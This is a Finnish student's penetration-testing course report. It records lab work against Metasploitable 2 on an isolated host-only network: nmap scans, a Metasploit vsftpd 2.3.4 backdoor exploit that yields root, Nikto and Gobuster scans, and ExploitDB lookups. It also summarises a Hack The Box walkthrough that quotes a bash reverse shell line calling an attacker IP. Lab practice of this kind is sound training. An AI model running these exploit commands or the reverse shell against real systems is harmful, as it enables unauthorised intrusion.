# Lab kid
Juho Tuovinen

Tässä raportissa aioin kertoa kuinka suoritin tehtävät, jotka on annettu Haaga Helian Tunkeutumisteustaus kurssilla. Tehtävät löytyvät [täältä](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid).

Tietokoneen speksit, jolla suoritan toimenpiteen:
- Apple MacBook 2015
- macOs Monterey versio 12.7
- Ram -muistia 16GB
- levytilaa/muistia vapaana 47,35 GB.

Ohjelmistot
- UTM Version 4.1.6 (75)
- VM OS: Kali Linux 2023.3 (kali-rolling)
- VirtualBox Version 7.0.6 r155176 (Qt5.15.2)

## Lue/katso ja tiivistä.
- Velu 2022: [Mastering Kali Linux for Advanced Penetration Testing 4ed: Chapter 10 - Exploitation](https://learning.oreilly.com/library/view/mastering-kali-linux/9781801819770/Text/Chapter_10.xhtml#_idParaDest-257): kappaleet "The Metasploit Framework", "The exploitation of targets using Metasploit" ja "Using public exploits".
  * The Metasploit Framework
    - Metasploit Framework on avoimen lähdekoodin työkalu, joka on suunniteltu helpottamaan penetraatiotestausta.
    - Kehys voidaan jakaa kolmeen osaan:
      - Kirjastot: MSF on rakennettu käyttämällä erilaisia toimintoja ja kirjastoja, kuten Ruby-ohjelmointikieltä. Penetraatiotestaajien on ymmärrettävä nämä toiminnot; miten ne laukaistaan, mitä parametreja niille tulisi antaa ja mitä odotettavissa olevat tulokset ovat
      - REX: REX on Metasploitissa mukana oleva kirjasto, jonka tarjoaa erilaisia luokkia, jotka ovat hyödyllisiä exploiteissa.
      - Moduulit: MSF moduulit ovat ohjelmakoodin osia, jotka suorittavat tietyn tehtävän hyökkäyksen aikana. Nämä moduulit voivat sisältää hyökkäyksiä, tietojen keräystä, skannausta ja muita taktiikoita.
  * Exploiting targets using MSF
    - Metasploit Framework on tehokas sekä käyttöjärjestelmän haavoittuvuuksien että kolmannen osapuolen sovellusten haavoittuvuuksien hyödyntämisessä
    - ProxyLogon-haavoittuvuus, jota Hafnium-ryhmä käytti hyväksi väärinkäyttämällä Microsoft Exchange Serveriä maaliskuussa 2021. Tämä johti laajoihin kyberhyökkäyksiin ja talouspetoksiin ympäri maailmaa. Neljä keskeistä hyödynnettävää haavoittuvuutta olivat:
      - CVE-2021-26855: Server Side Request Forgery (SSRF) - Hyökkääjät voivat lähettää erityisesti muotoiltuja HTTP-pyyntöjä etänä ilman tunnistautumista, ja palvelin hyväksyy epäluotettavat yhteydet TCP-porttiin 443.
      - CVE-2021-26857: Tämä on epävarma deserialisointihaavoittuvuus Microsoft Exchange Unified Messaging Servicessa (UMS), mikä mahdollistaa haitallisen koodin suorittamisen korkeilla SYSTEM-käyttöoikeuksilla. Tätä voidaan hyödyntää joko SSRF:n tai varastettujen tunnusten avulla.
      - CVE-2021-26858 ja CVE-2021-27065: Molemmat liittyvät mielivaltaiseen tiedoston kirjoitus -haavoittuvuuteen, joka mahdollistaa tiedostojen kirjoittamisen annettuun hakemistoon.
    - Seuraavassa esimerkissä yhdistämme CVE-2021-26855:n ohittaaksemme tunnistamisen ja jäljitelläksemme järjestelmänvalvojan tiliä, sekä CVE-2021-27065:n kirjoittaaksemme mielivaltaisen tiedoston hyötykuorman kanssa tarjotaksemme etäkoodin suorituksen palvelimella.
      - hyökkääjien on varmistettava, että kohde käyttää paikallista Microsoft Exchange Serveriä, joka on altistettu, ja lueteltava kaikki sähköpostiosoitteet onnistuneen hyökkäyksen suorittamiseksi. Testaajat voivat käyttää Python ProxyShell-enumerointiskriptiä luetteloidakseen kaikki käyttäjät, jotka ovat yhteydessä Exchange-palvelimiin. Onnistunut hyödyntäminen johtaa halutun koodin suoritukseen korkeilla SYSTEM-käyttöoikeuksilla.
      -  Kun hyökkäys on valmis, se avaa Meterpreter-reverse shellin kahden järjestelmän välille. Meterpreterin kehotteen tulisi avautua, ja testaaja voi käyttää etäjärjestelmää komentokehotteella. Yksi ensimmäisistä vaiheista kompromissin jälkeen on varmistaa, että olet kohdejärjestelmässä.
    - Toinen hyökkäys, jota tarkastelemme tässä osiossa, on MS17-010, joka aiheutti suurta vahinkoa WannaCry-lunnasohjelman avulla hyödyntäen EternalBlue-haavoittuvuutta huhtikuussa 2017.
      - Onnistunut hyödyntäminen mahdollistaa hyökkääjän suorittaa mielivaltaista koodia etäjärjestelmässä. Vaikka tämä hyökkäys on vanha, monet organisaatiot joutuvat edelleen turvautumaan joihinkin vanhoihin järjestelmiin.
      - Lopuksi hyödyntäminen tulisi tarjota meille vastaava Meterpreter-kuori kuin aiemmassa hyödyntämisessä. Hashdump-komento paljastaa kaikki käyttäjänimet ja salasanahajautukset. Lisäksi näiden tietojen tallentamiseksi verkossa liikkumisen tehostamiseksi testaajat voivat käyttää incognito- ja kiwi-moduuleja msfconsolessa.
  * Using public exploits
    - Jokainen hyökkääjä pitää silmällä jatkuvasti julkisia exploitteja ja muokkaa niitä tarpeidensa mukaisesti.
    - Usein penetraatiotestaajat löytävät nollapäivän hyödyntämisen testeissään, ja he yleensä ilmoittavat siitä yritykselle. Hyökkääjien tapauksessa kaikki löytyneet haavoittuvuudet muunnetaan exploiteiksi, jotka myydään rahasta/tunnustuksesta yrityksille.
    - Internetistä löytyy tietokantoja, jotka sisältävät exploiteja (Milw0rm, Exploit-DB (EDB)
    - Exploit-DB: EDB on tietokanta-arkisto julkisista exploiteista yhdessä haavoittuvien ohjelmistoversioiden kanssa. EDB on upotettu osaksi Kali Linux 2.0:aa osana julkaisua, ja sen avulla on melko helppo etsiä kaikkia saatavilla olevia exploiteja SearchSploitin kautta.
    - SearchSploit: yksinkertainen apuohjelma Kali Linuxissa, joka etsii kaikki exploitit EDB:stä avainsanahaulla hyökkäyksen alueen kaventamiseksi.


- Vapaavalintainen läpikävely [0xdf](https://0xdf.gitlab.io/) tai [ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos) (Kannattaa valita helppo; esim "Base Points: Easy")
  - [HTB: Broker](https://0xdf.gitlab.io/2023/11/09/htb-broker.html)
    - Broker on HackTheBoxin laatikko, joka korostaa vakavaa haavoittuvuutta ActiveMQ-viestijonovälittäjässä (CVE-2023-46604). Hyökkääjä hyödyntää tätä haavoittuvuutta saadakseen pääsyn järjestelmään, päästäkseen root-käyttäjäksi ja ajaa nginx:ää root-käyttäjänä, asettaa pystyyn valepalvelimen tiedostonlukua varten, ja lopulta kirjoittaa SSH-avaimen root-käyttäjälle. Lisäksi hän esittelee samanlaisen hyökkäystavan Zimbra-virhekonfiguraatiossa (CVE-2022-41347). Tässä tapauksessa hyökkääjä myrkyttää LD preload -tiedoston ajamalla nginx:n virhelokit kohti tuota tiedostoa ja lataamalla siihen haitallisen jaetun objektin.
    - Recon:
      - suorittaa Nmap-skannuksen ja löytää 9 avointa porttia (22,80,1883,5672,8161,39751,61613,61614,61616)
      - arvio porteista: SSH-portti voi olla hyödyllinen, portit 61613 ja 61616 liittyvät ActiveMQ:hun, portit 1883 ja 5672 liittyy viestijonoon, portit 8161 ja 61614 liittyvät Java-webpalvelimeen Jetty, portti 39751 on tuntematon ja OpenSSH-version perusteella todennäköisesti käytössä on Ubuntu 22.04 Jammy -versi.
      - Website - TCP 80:
        - sivusto kysyy tavallista HTTP-autentikointia
        - admin/admin-tunnukset toimivat. Autentikoinnin takana on on ActiveMQ:n hallintaliittymä
        - "Manage ActiveMQ broker" -linkki johtaa osoitteeseen /admin/: Tämä antaa mm. Broker ID:n, käynnissäolon ajan ja version
    - Shell as activemq:
      - tunnista haavoittuvuus
      - Ymmärrä exploit
      - aja POC
        - käynnistä Python-webpalvelin ja aja [Python-skripti](https://github.com/evkl1d/CVE-2023-46604)
        - webpalvelimella tapahtuu osuma, joten täytyy tarkastella XML-tiedostoa
        - hyökkäyksen mukana tulee poc.xml ja siinä kutsutaan selvästi perinteistä bash reverse shelliä, <code>bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001'</code>
        - päivitä kuorman omaan IP-osoitteeseen ja isännöi sitä Python-webpalvelimella
        - kun nc kuuntelee portissa 9001, aja hyökkäys uudelleen. Se hakee poc.xml:n.
        - pääsy saadaan shelliin nc:n kautta. Tehdään shellin päivitys ja napataan user.txt-tiedosto
    - Shell as root:
      - käyttäjä "activemq" voi ajaa nginx-palvelinta juurikäyttäjänä ilman salasanaa
      - luodaan haitallinen web-palvelin
        - lähetään kyselyitä web-palvelimelle portissa 1337 ja voidaan lukea tiedostoja root-äyttäjänä
        - lippu tehtävään löytyy tiedostosta <code>localhost:1331/root/root.txt</code>

- Nyrkkeilysäkki ei kuulu. Etsi hakukoneesta kotitehtäväraportti, jossa Kali ja Metasploitable on asennettu samaan verkkooon VirtualBoxiin; sekä testaamalla osoitettu, että koneet on saatu irti Internetistä. Tällaiset tehtävät ovat olleet jonain vuonna esimerkiksi nimillä "Nyrkkeilysäkki" ja "Ei kuulu". (Löytyy hakukoneista, esimerkiksi hakusanoilla "[tero karvinen nyrkkeilysäkki](https://www.google.com/search?q=tero+karvinen+nyrkkeilys%C3%A4kki)". Raportit voivat olla pitkiä, vain nuo mainitut kohdat tarvitsee käsitellä)

  - Virtualboxin asetuksista asetetaan Metasploitable2 ja Kali host-only -verkkoon
  - Voidaan molemmilla koneilla pingata googlea <code>ping 8.8.8.8</code> ja vastaukseksi pitäsi tulla "Network is unreachable".
  - otetaan selvää löytävätkö koneet toisesnsa samasta verkosta pingaamalla toisiaan
    
Lähde: rikurikurikuriku, H2 Turbo Mode, b), GitHub,  https://github.com/rikurikurikuriku/PenTestCourse/wiki/H2-Turbo-Mode


## a) Asenna Kali virtuaalikoneeseen
Asennan Kali Linux -käyttöjärjestelmän VirtualBoxiin. Minulla on on valmiiksi ladattu Kali Linux 2023.2a iso-tiedosto (todettu toimivaksi omassa Macissani UTM-ohjelmiston kanssa), jota käytän tehtävässä. Tiedosto peräisin [kali.org](https://www.kali.org/). Annan virtuaalikoneelle seuraavat speksit:

- Base Memory: 4096 MB
- Processors: 4
- Disk Size: 50,00 GB

Asennus näytti edistyvän normaalisti, mutta bootatessa ruutu oli musta ja siinä välkkyi valkoinen kursori. Boottaus ei edennyt. Minulla on ollut aikaisemmin sama ongelma VirtualBoxin kanssa, enkä ole ratkaissut mistä ongelma johtuu. Seuraavissa tehtävissä läytän valmiiksi asennettua Kali Linuxia.

## b) Asenna Metasploitable 2 virtuaalikoneeseen

Latasin tiedoston [täältä](https://sourceforge.net/projects/metasploitable).

Koska Kalin asennus VirtualBoxiin ei onnistunut, halusin myös Metasploitable asentaa UTM:ään. Käytin asennuksessa apuna Youtube-videosta [How to install Metasploitable on a Macbook with an M1 Chip](https://www.youtube.com/watch?v=E3IJ_d3rAgA). Vaikka video neuvoo asennuksen M1-koneille, toimi kyseinen asennus myös vanhemmalle Applen Macbookille.

Valitsin Network Modeksi "Host-Only". Käynnistin koneen ja kirjauduin sisään.
<img src="/images/msf1.png" alt="" title="" width="70%" height="70%">

## c) Tee koneille virtuaaliverkko, jossa
- Kali saa yhteyden Internettiin, mutta sen voi laittaa pois päältä
- Kalin ja Metasploitablen välillä on host-only network, niin että porttiskannatessa ym. koneet on eristetty intenetistä, mutta ne saavat yhteyden toisiinsa
- Osoita eri komennoilla, että Internet-yhteys katkeaa: 'ping 1.1.1.1', 'ping www.google.com', 'curl www.google.com'

UTM-virtualisointiohjelmasta olen valinnut molempiin virtuaalikoneisiin Host-Only -vaihtoehdon. Tällä hetkellä Kali eikä Metasploitable ole yhteydessä internetiin. Testasin, etteivät koneet ole yhteydessä internettiin eri komennoilla.
Kali:
<img src="/images/testi1.png" alt="" title="" width="70%" height="70%">
Metasploitable:
<img src="/images/msf2.png" alt="" title="" width="70%" height="70%">

Pingasin koneilla myös toisiaan testatakseni, että yhteys toisiinsa löytyy.

<img src="/images/testi2.png" alt="" title="" width="70%" height="70%">
<img src="/images/testi3.png" alt="" title="" width="70%" height="70%">

## d) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable. Katso, ettei skannauspaketteja vuoda Internetiin - kannattaa irrottaa koneet netistä skannatessa.

Käynnistin Metasploitablen tarvitseman tietokannan komennolla <code>sudo systemctl start postgresql</code>. Seuraavaksi annoin komennon <code>sudo msfdb init</code>, mikä käynnistää PostgreSQL-tietokannan ja suorittaa alustavat konfiguraatiot sekä asettaa ympäristömuuttujat ja luo tarvittavat tiedostot ja hakemistot. Avasin Metasploit Framework- työkalun komennolla <code>msfconsole</code>. Sen jälkeen annoin komennon <code>db_nmap -sn 192.168.12.3</code>, joka suorittaa Nmap ping-skannauksen määritettyyn IP-osoitteeseen (Metasploitable-koneeseen) ja päivittää tiedot Metasploit-tietokantaan. <code>-sn</code>-vaihtoehto ohjeistaa Nmapia suorittamaan host discovery -skannauksen ilman itse palvelun porttien tai palveluiden skannausta.

<img src="/images/msf4.png" alt="" title="" width="70%" height="70%">
<img src="/images/msfsivu.png" alt="" title="" width="70%" height="70%">

Tehtävään sain apua [Vilpun GitHubista](https://github.com/vilppuuu/tunkeutumistestaus/blob/main/h2_laksyt.md).

## e) Porttiskannaa Metasploitable huolellisesti (db_nmap -A -p0-). Analysoi tulos. Kerro myös ammatillinen mielipiteesi (uusi, vanha, tavallinen, erikoinen), jos jokin herättää ajatuksia.
Skannasin Metasploitablen komennolla <code>db_nmap -A -p0- 192.168.12.3</code>.

- <code>A</code>: Suorittaa aggressiivisen skannauksen, joka sisältää käyttöjärjestelmän havaitsemisen, versiotietojen keräämisen, palveluiden tunnistamisen, sekä muita yksityiskohtaisia tietoja.
- <code>-p0-</code>: Skannaa kaikki portit nollasta eteenpäin.

<img src="/images/dbnmap.png" alt="" title="" width="70%" height="70%">

Tulostus oli pitkä. Tämä tarkoittaa, että avoimia portteja ja palveluja on käytössä kohteessa harvinaisen paljon. Tämä on huolestuttavaa tietoturvan kannalta, sillä useampi avonainen portti laajentaa hyökkäyspintaa. Muutamat erikoiset havainnot, joita tein:
- Useassa palvelussa on vanhentuneet järjestelmät, eikä niitä ole päivitetty. Tämä mahdollistaa hyökkääjän käyttää löydettyjä ja tunnettuja exploiteja palveluihin (esim. OpenSSH 4.7p1 ja Apache httpd 2.2.8
- UnrealIRCd-palvelimen ylläpitäjän sähköpostiosoite näkyy skannauksessa portissa 6667 ja 6697. Tietoa voidaan käyttää hyväksi jatkohyökkäyksissä.
- portissa 21 on FTP-palvelin, johon voi kirjautua anonyymisti ilman salasanaa
- telnet, portti 23 avoinna: Telnet lähettää käyttäjän kirjautumistiedot selkokielisenä, joten se ei salaa tietoliikennettä. Tämä tarkoittaa, että käyttäjänimet, salasanat ja kaikki muut tiedot ovat helposti nähtävissä, jos joku pystyy sieppaamaan verkkoliikenteen.

## f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)

Suoritin ensimmäiseksi verioskannauksen porttiin 21.

`````
msf6 > db_nmap -sV -p 21 192.168.12.3
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 23:59 EET
[*] Nmap: Nmap scan report for 192.168.12.3
[*] Nmap: Host is up (0.0017s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 2.3.4
[*] Nmap: Service Info: OS: Unix
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
`````
Skannauksesta näemme, että käytössä on VsFtpd versio 2.3.4. Voimme käyttää tätä tietoa hyväksi exploitin etsimisessä. 
Komennolla <code>search vsftpd</code> backdoor-moduuli versiolle 2.3.4 löytyi. Käytän moduulia päästäkseni kirjautumaan sisälle kohteeseen:

````
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.12.3
rhosts => 192.168.12.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
````
Yhteys on luotu ja kirjauduttu root-käyttäjänä.

<img src="/images/exploit1.png" alt="" title="" width="70%" height="70%">
<img src="/images/exploit2.png" alt="" title="" width="70%" height="70%">


## g) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)

Loin uuden käyttäjän "user1" komennolla <code>sudo adduser user1</code>. Skippasin enterillä loput täytettävät infot ja kirjauduin sessiosta ulos. Menin Kalin terminaaliin ja otin yhteyttä SSH-yhteydellä luomalle käyttäjälleni komennolla <code>ssh user1@192.168.12.3</code>, mutta sain virheilmoituksen:

````
┌──(kali㉿kali)-[~]
└─$ ssh user1@192.168.12.3         
Unable to negotiate with 192.168.12.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
````
ChatGPT auttoi neuvomaan kokeilemaan seuraavaa komentoa: <code>ssh -oHostKeyAlgorithms=+ssh-rsa user1@192.168.12.3</code> ja pääsin sillä kirjautumaan käyttäjälleni. 

<img src="/images/user.png" alt="" title="" width="70%" height="70%">

ChatGPT:n mukaan: "Virheilmoituksesi "Unable to negotiate with 192.168.12.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss" viittaa siihen, että SSH-asiakas ei löytänyt yhteensopivaa avaintyyppiä, kun yritettiin neuvotella SSH-yhteyttä palvelimen kanssa.Tämä voi johtua siitä, että SSH-palvelin tukee avaintyyppejä, joita SSH-asiakkaasi ei tue. Voit yrittää ratkaista tämän ongelman lisäämällä -o-vaihtoehdon käyttäen HostKeyAlgorithms-määritystä. <code>ssh -oHostKeyAlgorithms=+ssh-rsa user1@192.168.12.3</code> -komento määrää käyttämään ssh-rsa-avaintyyppiä neuvotteluissa."

Myöhemmin tajusin. että käyttäjälle olisi voinut antaa admin-oikeudet.

## h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)

Hetken selailtuani ExploitDB:tä, löysin [Microsoft Office 365 Version 18.2305.1222.0 - Elevation of Privilege + RCE](https://www.exploit-db.com/exploits/51609) exploitin, joka kiinnosti minua.

- Title: Microsoft Office 365 Version 18.2305.1222.0 - Elevation of Privilege + RCE.
- Author: nu11secur1ty
- Date: 07.18.2023
- Vendor: https://www.microsoft.com/
- Software: https://www.microsoft.com/en-us/microsoft-365/microsoft-office
- Reference: https://portswigger.net/web-security/access-control
- CVE-2023-33148
- Staus: HIGH Vulnerability

Kyseinen exploit on Microsoft Office 365 -versioon 18.2305.1222.0. Sovellus on haavoittuvainen oikeuksien nostolle (Elevation of Privilege).Hyökkääjä voi käyttää tätä haavoittuvuutta liittämällä vaarallisen Word-tiedoston Outlook-sähköpostisovellukseen, joka on osa Microsoft Office 365:tä ja voi helposti huijata uhria napsauttamaan sitä. Avatessaan sen, hyökkäys suorittaa erittäin vaarallisen komentokehoteen paikallisen tietokoneen taustalla. Tämä suoritus tapahtuu ilman tämän haitallisen tiedoston lataamista.

Hyökkäyksen voi katsoa [täältä](https://www.youtube.com/watch?time_continue=3&v=h9UWf7R49H8&embeds_referring_euri=https%3A%2F%2Fwww.nu11secur1ty.com%2F&source_ve_path=MzY4NDIsMzY4NDIsMzY4NDIsMTM5MTE3LDM2ODQyLDM2ODQyLDI4NjY2&feature=emb_logo).


## i) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla. Muista päivittää. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi. Valitse eri hyökkäys kuin edellisessä kohdassa.)

Päivitin SearchSploit-tietokannan komennolla <code>sudo searchsploit -u</code>. Sen jälkeen etsin Exploit Databasesta Apacheen liittyvät haavoittuvuudet ja hyökkäykset komennolla <code>searchsploit apache</code>.

<img src="/images/searchsploit1.png" alt="" title="" width="70%" height="70%">

Valitsin sattumanvaraisesti "Apache - Denial of Service" ja lähdin tutkimaan sitä. Komennolla <code>searchsploit -p 20558</code> nähdään hieman enemmän tietoja haavoittuvuudesta. 20558 on haavoittuvuuden ID, jolla etsin lisätietoa.


`````
msf6 > searchsploit -p 20558
[*] exec: searchsploit -p 20558

  Exploit: Apache 1.2 - Denial of Service
      URL: https://www.exploit-db.com/exploits/20558
     Path: /usr/share/exploitdb/exploits/multiple/dos/20558.txt
    Codes: CVE-1999-0107, OSVDB-5821
 Verified: True
File Type: ASCII text
`````
Lähdin tutkimaan mainittua [verkko-osoitetta](https://www.exploit-db.com/exploits/20558) ja siellä kerrotaan haavoittuvuuden toimivan suomennettuna näin: "Apache Web Server 1.2 ja sitä aiemmat versiot ovat alttiita palvelunestohyökkäykselle. Pyytämällä virheellistä GET-pyyntöä, joka koostuu epätavallisen suuresta määrästä '/'-merkkejä, hyökkääjä voi aiheuttaa prosessorin käytön äkillisen kasvun. Palvelun normaalin toiminnan palauttamiseksi on suoritettava palvelimen uudelleenkäynnistys."

Eli kyseessä on DoS- hyökkäys, joka pyrkii tekemään Apache HTTP Serverin tai siihen liittyvän verkkopalvelimen saavuttamattomaksi tai heikentämään sen suorituskykyä estämällä laillisen liikenteen käsittelyä.

## j) Kokeile vapaavalintaista haavoittuvuusskanneria johonkin Metasploitablen palveluun. (Esim. nikto, wpscan, openvas, nessus, nucleus tai joku muu)

Päätin tässä harjoituksessa kokeilla Niktoa, sillä se on jo valmiiksi Kali Linux:issa asennettuna.

Nikto on avoimen lähdekoodin web-palvelimen skannaus- ja testausohjelmisto, joka on suunniteltu etsimään haavoittuvuuksia web-palvelimissa.

Skannasin kohdekoneeni (Metasploitable) komennolla <code>nikto -h 192.168.12.3</code>.
- <code>-h</code>: määrittää skannauksen kohteen
- <code>192.168.12.3</code>: skannauksen kohde (Metasploitable)

<img src="/images/nikto.png" alt="" title="" width="70%" height="70%">

Skannauksesta tuli hyvin dataa. Kun tutkitaan tulostusta, Nikto löytää useita haavoittuvuuksia, joita voidaan hyödyntää. Tässä esiteltynä muutama:
- Apache/2.2.8 appears to be outdated (vanhempaan versioon varmasti löytyy tunnettuja haavoittuvuuksia)
- /doc/: Directory indexing found (verkkopalvelin sallii hakemistojen sisällön näkymisen verkkoselaimessa)
- /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names.
  
## k) Kokeile jotain itsellesi uutta työkalua, joka mainittiin x-kohdan läpikävelyohjeessa.

Läpikävelyohjeessa [HackTheBox - Download](https://www.youtube.com/watch?v=UUn9x7mw1i0) käytetään Gobusteria, joten päätin testata kyseistä ohjelmaa. Gobuster on FFUF:n kaltainen työkalu, joka on tarkoitettu verkkosivuston hakemistorakenteen tutkimiseen.

Liitin hetkeksi Kali-koneeni verkkoon ja asensin Gobusterin komennolla <code>sudo apt-get install gobuster</code>. Asennuksen jälkeen laitoin koneen takaisin Host-Only -tilaan, jotta vältetään ylimääräiset vahingot seuraavassa testivaiheessa. 

Lähdin testaamaan työkalua Metasploit-kohteeseeni komennolla <code>gobuster dir -u 192.168.12.3 -w ~/wordlists/common.txt</code>.

- <code>dir</code> kertoo Gobusterille, että kyseessä hakemistoskannaus
- <code>-u [URL]</code>määrittelee kohdesivuston osoitteen, jonka rakennetta halutaan tutkia
- <code>-w wordlist.txt</code> määrittelee sanalistan, jota halutaa hyödyntää

Käytin tehtävässä samaa sanalistaa kuin aikaisemmissa FFUF-tehtävissä.

Tulostus:

````
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.12.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 294]
/.hta                 (Status: 403) [Size: 289]
/.htpasswd            (Status: 403) [Size: 294]
/cgi-bin/             (Status: 403) [Size: 293]
/dav                  (Status: 301) [Size: 315] [--> http://192.168.12.3/dav/]
/index                (Status: 200) [Size: 891]
/index.php            (Status: 200) [Size: 891]
/phpMyAdmin           (Status: 301) [Size: 322] [--> http://192.168.12.3/phpMyAdmin/]
/phpinfo              (Status: 200) [Size: 47978]
/phpinfo.php          (Status: 200) [Size: 47990]
/server-status        (Status: 403) [Size: 298]
/test                 (Status: 301) [Size: 316] [--> http://192.168.12.3/test/]
/twiki                (Status: 301) [Size: 317] [--> http://192.168.12.3/twiki/]
Progress: 4686 / 4687 (99.98%)
===============================================================
Finished
===============================================================
````
Gobuster paljastaa meille mm. <code>/phpMyAdmin</code>-sivun, jossa kirjautuminen tapahtuu ja <code>/phpinfo</code>, joka antaa yksityiskohtaista tietoa PHP-asennuksesta ja -konfiguraatiosta ja voi sisältää arkaluonteista tietoa.


## m) Vapaaehtoinen: Kokeile hyökkäystä, joka löytyy ExploitDB:sta. Huomaa, että joidenkin vanhempien hyökkäysten mukana tulee harjoitusmaali.
## n) Vapaaehtoinen: Murtaudu johonkin toiseen Metasploitablen palveluun.
## o) Vapaaehtoinen: Asenna ja korkkaa Metasploitable 3. Karvinen 2018: Install Metasploitable 3 – Vulnerable Target Computer

## Lähteet


Karvinen, Tero: Oppitunnit 2023-11-06, Tunkeutumistestaus, h2-Lab Kid (https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid)

https://learning.oreilly.com/library/view/mastering-kali-linux/9781801819770/Text/Chapter_10.xhtml#_idParaDest-249

https://0xdf.gitlab.io/2023/11/09/htb-broker.html

https://github.com/vilppuuu/tunkeutumistestaus/blob/main/h2_laksyt.md

https://www.youtube.com/watch?time_continue=3&v=h9UWf7R49H8&embeds_referring_euri=https%3A%2F%2Fwww.nu11secur1ty.com%2F&source_ve_path=MzY4NDIsMzY4NDIsMzY4NDIsMTM5MTE3LDM2ODQyLDM2ODQyLDI4NjY2&feature=emb_logo

https://www.exploit-db.com/exploits/51609

https://www.exploit-db.com/exploits/20558

